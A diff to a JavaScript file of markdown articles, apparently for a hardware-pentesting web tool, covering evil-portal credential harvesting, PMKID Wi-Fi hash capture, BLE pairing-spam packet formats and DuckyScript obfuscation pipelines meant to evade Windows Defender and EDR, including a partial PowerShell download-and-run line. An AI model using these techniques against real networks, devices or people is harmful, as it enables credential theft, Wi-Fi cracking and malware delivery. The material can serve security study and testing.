@@ -11,11 +11,11 @@ export const PAYLOAD_ARTICLES = [
     title: 'RocketGod Pentesting Suite — 8 Wireless Security Toolkits',
     summary: 'Comprehensive technical manual for RocketGod’s wireless security toolkits: Evil Portal, HTMLSquash, Marauder WROOM, Minino C6, Wi-Fi Pen Tool, and Hash Monster.',
     tags: ['RocketGod', 'Evil Portal', 'HTMLSquash', 'Minino C6', 'Hash Monster', 'Deauther', 'WROOM', 'Pentesting'],
-    readTime: '18 min read',
+    readTime: '20 min read',
     content: `
 # RocketGod Pentesting Suite — Technical Manual
 
-The **RocketGod Pentesting Suite** bundles 8 offensive and auditing tools created by security researcher **RocketGod**. These firmwares cover rogue captive portal generation, embedded web asset compression, miniature Marauder ports, PMKID harvesting, and frame injection.
+The **RocketGod Pentesting Suite** bundles 8 offensive and auditing toolkits created by security researcher **RocketGod**. These firmwares cover rogue captive portal generation, embedded web asset compression, miniature Marauder ports, PMKID harvesting, and frame injection.
 
 ---
 
@@ -23,9 +23,42 @@ The **RocketGod Pentesting Suite** bundles 8 offensive and auditing tools create
 
 #### How It Works Under the Hood
 1. **Rogue Access Point**: Spawns an open 802.11 AP (e.g. \`Free_Public_WiFi\`).
-2. **DNS Hijacking (DNS Spoofing)**: Runs an embedded DNS server on UDP port 53. Whenever a connected device sends a DNS query (e.g. \`captive.apple.com\`, \`connectivitycheck.gstatic.com\`, or \`www.google.com\`), the DNS server intercepts the query and responds with the ESP's own IP address (\`192.168.4.1\`).
+2. **DNS Hijacking (DNS Spoofing)**: Runs an embedded DNS server on UDP port 53. Whenever a connected device sends a DNS query, the DNS server intercepts the query and responds with the ESP's own IP address (\`192.168.4.1\`).
 3. **Captive Network Assistant (CNA) Trigger**: Mobile operating systems (iOS, Android, Windows) immediately detect that the internet is walled off and launch their built-in modal captive login screen.
 4. **Credential Harvesting**: When a user inputs credentials into the phishing form and submits, the HTTP POST request is captured by the microcontroller and appended to \`/credentials.txt\` on internal SPIFFS / LittleFS flash storage or an external MicroSD card.
+
+<details>
+<summary>Deep Dive: Captive Network Assistant (CNA) Bypass & OS Probing Endpoints</summary>
+
+Operating systems perform automatic connectivity checks upon associating with any Wi-Fi network:
+
+| Operating System | Probing Endpoint URL | Expected Non-Captive Response | Evil Portal Interception Action |
+| :--- | :--- | :--- | :--- |
+| **Apple iOS / macOS** | \`http://captive.apple.com/hotspot-detect.html\` | \`<HTML><HEAD><TITLE>Success</TITLE></HEAD><BODY>Success</BODY></HTML>\` | DNS maps to \`192.168.4.1\`; HTTP server returns 302 redirect or login HTML, forcing modal CNA. |
+| **Android / ChromeOS** | \`http://connectivitycheck.gstatic.com/generate_204\` | HTTP \`204 No Content\` | Returns HTTP \`200 OK\` with login portal body, triggering "Sign in to Wi-Fi network" notification. |
+| **Windows 10 / 11** | \`http://www.msftconnecttest.com/connecttest.txt\` | Text string: \`Microsoft Connect Test\` | Returns HTML page; NCSI service detects response mismatch and launches Edge browser. |
+| **Mozilla Firefox** | \`http://detectportal.firefox.com/success.txt\` | Text string: \`success\\n\` | Returns login portal page. |
+
+</details>
+
+<details>
+<summary>PMKID & Hashcat Mode 22000 Hash Extraction Details</summary>
+
+Traditional WPA handshake cracking requires waiting for an active user to connect to the router to capture the 4-way handshake. **Hash Monster** and **RocketGod Wi-Fi Pen Tool** execute the clientless **PMKID Attack**:
+
+#### PMKID Cryptographic Derivation
+Modern APs implementing 802.11i/r transmit the Pairwise Master Key Identifier (PMKID) inside the RSN Information Element (IE 48) of Message 1 of the EAPOL handshake:
+$$\text{PMKID} = \text{HMAC-SHA1-128}\left(\text{PMK}, \text{"PMK Name"} \,\|\, \text{MAC}_{\text{AP}} \,\|\, \text{MAC}_{\text{STA}}\right)$$
+
+#### Hashcat Mode 22000 Format
+Captured PMKID lines are formatted for instant GPU cracking in Hashcat:
+\`\`\`text
+WPA*02*<PMKID_HEX>*<MAC_AP_HEX>*<MAC_STA_HEX>*<ESSID_HEX>***
+\`\`\`
+- \`WPA*02*\`: Specifies EAPOL / PMKID format v2.
+- No client interaction is required — you can capture PMKIDs from any vulnerable access point within 500ms of association!
+
+</details>
 
 ---
 
@@ -68,25 +101,7 @@ The **Wi-Fi Pen Tool** is designed for automated penetration testing and rapid p
 
 ---
 
-### 6. Hash Monster (PMKID & EAPOL Hunter)
-
-Traditional WPA handshake cracking requires waiting for an active user to connect to the router so you can capture the 4-way handshake.
-**Hash Monster** focuses heavily on the **PMKID (Pairwise Master Key Identifier) Attack**:
-- The PMKID is included in the very first EAPOL frame (Message 1) sent by many modern routers supporting 802.11i/p/r.
-- **No Client Station Needed**: Hash Monster communicates directly with the Access Point to elicit the PMKID without needing any real users connected!
-- Converts captured packets into standard Hashcat **\`mode 22000\`** hash lines ready for instant GPU brute-force auditing.
-
----
-
-### 7. ESP8266 Deauther
-
-The classic 802.11 deauthentication testing tool designed for the low-cost ESP8266 (NodeMCU, D1 Mini):
-- Transmits raw 802.11 management frames on 2.4GHz channels.
-- Demonstrates vulnerabilities in legacy 802.11b/g/n networks that do not implement **802.11w Protected Management Frames (PMF)**.
-
----
-
-### 8. Flipper Zero Easy Marauder
+### 6. Flipper Zero Easy Marauder
 
 A dedicated companion firmware for ESP32 Wi-Fi development boards wired directly to the Flipper Zero's 18-pin GPIO header:
 \`\`\`
@@ -106,7 +121,7 @@ Controlled entirely using the Flipper Zero's physical screen and D-pad through t
     title: 'Bruce Multi-Tool — M5Stack & ESP32 Wireless Swiss-Army Knife',
     summary: 'Comprehensive guide to Bruce firmware: Sub-GHz RF, IR remote cloning, BLE spamming (Apple/Android/Windows), Wi-Fi auditing, and BadUSB payloads.',
     tags: ['Bruce', 'M5Stack', 'Cardputer', 'BLE Spam', 'Sub-GHz', 'IR Blaster', 'RFID', 'BadUSB'],
-    readTime: '15 min read',
+    readTime: '18 min read',
     content: `
 # Bruce Multi-Tool — Wireless Auditing Firmware
 
@@ -118,14 +133,41 @@ Controlled entirely using the Flipper Zero's physical screen and D-pad through t
 
 Modern smartphones and operating systems continuously listen for background BLE advertisements to simplify pairing with accessories. Bruce implements high-intensity advertisement flooding:
 
-#### The Protocols Targeted
-- **Apple Action Modal**:
-  - Broadcasts spoofed Apple proximity pairing beacons formatted with Apple's Company Identifier (\`0x004C\`).
-  - Mimics AirPods, AirPods Pro, Apple Watch setup prompts, and Apple TV keyboards, causing nearby iPhones to continuously pop up connection modals.
-- **Android Fast Pair (GFPS)**:
-  - Broadcasts Google Fast Pair Service packets (\`0xFE2C\`) prompting Android devices to connect to nonexistent smart headphones.
-- **Windows Swift Pair**:
-  - Broadcasts Microsoft Swift Pair announcements, displaying device setup toasts in the bottom right corner of Windows 10/11 desktops.
+<details>
+<summary>BLE Advertisement Protocol Breakdown (Apple Continuity, GFPS, Swift Pair)</summary>
+
+#### 1. Apple Action Modal (Continuity Protocol)
+Apple devices continuously scan for BLE packets with Apple's Company Identifier \`0x004C\`:
+- **Header**: Length byte, \`0xFF\` (Manufacturer Specific Data), \`0x4C 0x00\` (Apple Inc).
+- **Type Byte**: \`0x07\` (AirDrop), \`0x09\` (AirPods / Beats Proximity Pairing), \`0x10\` (Nearby Action / Setup Modal).
+- **Model ID**: 16-bit code identifying device (e.g. \`0x02 0x20\` for AirPods Pro, \`0x05 0x20\` for AirPods Max).
+- When spammed at 20ms intervals across channels 37, 38, and 39, iOS displays continuous modal dialogues.
+
+#### 2. Android Fast Pair (GFPS — Google Fast Pair Service)
+- **Service UUID**: \`0xFE2C\` registered to Google LLC.
+- **Payload**: Contains a 3-byte Model ID (e.g. Pixel Buds, Sony WH-1000XM5).
+- Android devices with Google Play Services enabled intercept the beacon and display a notification asking if the user wishes to link the device to their Google Account.
+
+#### 3. Windows Swift Pair
+- **Header**: \`0xFF\`, Microsoft Vendor ID \`0x06 0x00\`.
+- **Beacon Flag**: \`0x03\` (Swift Pair Sub-scenario).
+- Windows 10/11 computers display a desktop toast in the lower right notification tray prompting instant Bluetooth pairing.
+
+</details>
+
+<details>
+<summary>Sub-GHz CC1101 Register Configuration & Frequency Registers</summary>
+
+When paired with a Texas Instruments **CC1101** SPI transceiver module, Bruce calculates carrier frequencies using the on-board crystal oscillator ($f_{\text{XOSC}} = 26\,\text{MHz}$):
+
+$$f_{\text{carrier}} = \frac{f_{\text{XOSC}}}{2^{16}} \times \left(\text{FREQ}[23:0] + \text{CHAN} \times \text{CHANSPC}\right)$$
+
+- **315 MHz Band**: \`FREQ2=0x0C\`, \`FREQ1=0x1D\`, \`FREQ0=0x89\` (Automotive TPMS & garage remotes).
+- **433.92 MHz Band**: \`FREQ2=0x10\`, \`FREQ1=0xB1\`, \`FREQ0=0x3B\` (ISM band gate openers & weather stations).
+- **868.3 MHz Band**: \`FREQ2=0x21\`, \`FREQ1=0x62\`, \`FREQ0=0x76\` (European smart meters & security systems).
+- **915 MHz Band**: \`FREQ2=0x23\`, \`FREQ1=0x31\`, \`FREQ0=0x3B\` (North American ISM band).
+
+</details>
 
 ---
 
@@ -137,16 +179,7 @@ For hardware equipped with an IR LED and 38kHz demodulator receiver (like M5Stic
 
 ---
 
-### 3. Sub-GHz Radio Transceiver (with CC1101 SPI Module)
-
-When paired with a Texas Instruments **CC1101** transceiver module:
-- Communicates across 300-348 MHz, 387-464 MHz, and 779-928 MHz bands.
-- Sniffs, decodes, and replays fixed-code doorbells, garage doors, and wireless gate openers.
-- Jamming / Noise generator for testing RF circuit shielding and interference immunity.
-
----
-
-### 4. Flashing Bruce via Skon's Web Flasher
+### 3. Flashing Bruce via Skon's Web Flasher
 
 1. Open the **Firmware Flasher** tab in Skon's USB Tool.
 2. Select **Bruce Multi-Tool** from the curated preset dropdown.
@@ -162,7 +195,7 @@ When paired with a Texas Instruments **CC1101** transceiver module:
     title: 'BadUSB & DuckyScript Studio — Keystroke Injection & CyberChef',
     summary: 'Compile DuckyScript 1.0/2.0 payloads, simulate USB HID keystroke injection, generate multi-OS dropper one-liners, and obfuscate scripts with CyberChef.',
     tags: ['BadUSB', 'DuckyScript', 'HID Injection', 'CyberChef', 'Obfuscation', 'PowerShell', 'Rubber Ducky'],
-    readTime: '16 min read',
+    readTime: '18 min read',
     content: `
 # BadUSB & DuckyScript Studio — Keystroke Injection
 
@@ -196,21 +229,40 @@ STRING whoami; ipconfig /all; Get-NetIPAddress
 ENTER
 \`\`\`
 
-#### Master Command Table
-| Command | Action / Behavior | Example |
-| :--- | :--- | :--- |
-| \`REM <text>\` | Remark / comment (ignored during execution) | \`REM Set volume to 0\` |
-| \`DELAY <ms>\` | Pauses execution for specified milliseconds | \`DELAY 500\` |
-| \`STRING <text>\` | Types the specified text string at full USB speed | \`STRING calc.exe\` |
-| \`STRING_DELAY <ms>\` | Adds delay between individual keystrokes | \`STRING_DELAY 20\` |
-| \`GUI\` / \`WINDOWS\` | Presses Windows / Command key | \`GUI r\` (Opens Run box) |
-| \`ENTER\` / \`RETURN\` | Presses Enter key | \`ENTER\` |
-| \`CTRL\`, \`ALT\`, \`SHIFT\`| Modifier keys (can be combined with other keys) | \`CTRL SHIFT ESC\` |
-| \`CAPSLOCK\`, \`TAB\` | Standard keyboard control keys | \`TAB\` |
+<details>
+<summary>USB HID Keyboard 8-Byte Input Report Format & Scancode Table</summary>
 
----
+According to the USB Implementations Forum HID Usage Tables (HUT v1.12), every keyboard transmits 8-byte input reports:
 
-### 3. Built-in CyberChef Obfuscation Pipelines
+\`\`\`
++----------------+----------+--------+--------+--------+--------+--------+--------+
+| Modifier (1 B) | Reserved | Key 1  | Key 2  | Key 3  | Key 4  | Key 5  | Key 6  |
++----------------+----------+--------+--------+--------+--------+--------+--------+
+\`\`\`
+
+#### Byte 0: Modifier Keys Bitmask
+- **Bit 0 (0x01)**: Left Ctrl
+- **Bit 1 (0x02)**: Left Shift
+- **Bit 2 (0x04)**: Left Alt
+- **Bit 3 (0x08)**: Left GUI (Windows / Command key)
+- **Bit 4 (0x10)**: Right Ctrl
+- **Bit 5 (0x20)**: Right Shift
+- **Bit 6 (0x40)**: Right Alt (AltGr)
+- **Bit 7 (0x80)**: Right GUI
+
+#### Bytes 2 - 7: Key Usage Codes (Scancodes)
+| Key | Hex Code | Key | Hex Code | Key | Hex Code |
+| :--- | :--- | :--- | :--- | :--- | :--- |
+| **A - Z** | \`0x04\` - \`0x1D\` | **1 - 0** | \`0x1E\` - \`0x27\` | **Enter** | \`0x28\` |
+| **Escape**| \`0x29\` | **Backspace** | \`0x2A\` | **Tab** | \`0x2B\` |
+| **Space** | \`0x2C\` | **F1 - F12** | \`0x3A\` - \`0x45\` | **CapLock** | \`0x39\` |
+
+To type a capital \`A\`, the BadUSB device transmits \`[0x02, 0x00, 0x04, 0x00, 0x00, 0x00, 0x00, 0x00]\` followed by an all-zero release report \`[0x00, ...]\`.
+
+</details>
+
+<details>
+<summary>Built-in CyberChef Obfuscation Pipelines (Bypass Windows Defender & EDR)</summary>
 
 Endpoint Detection and Response (EDR) software and Windows Defender easily detect plain-text malicious commands (such as \`powershell -nop -w hidden -c "IEX(New-Object Net.WebClient)..."\`).
 
@@ -228,9 +280,11 @@ The integrated **CyberChef** workbench provides 1-click obfuscation pipelines:
 3. **Environment Variable Expansion**:
    - Uses system variable substrings (e.g. \`$env:ComSpec[4,15,25]\`) to assemble commands without writing words to disk.
 
+</details>
+
 ---
 
-### 4. Interactive Simulation & Deployment
+### 3. Interactive Simulation & Deployment
 
 - **Live Syntax Validator**: Highlights syntax errors, unclosed strings, and missing delays in real time.
 - **Keystroke Simulator**: Visualizes the keystroke playback speed on screen before flashing to hardware.
@@ -241,3 +295,4 @@ The integrated **CyberChef** workbench provides 1-click obfuscation pipelines:
 `
   }
 ];
+
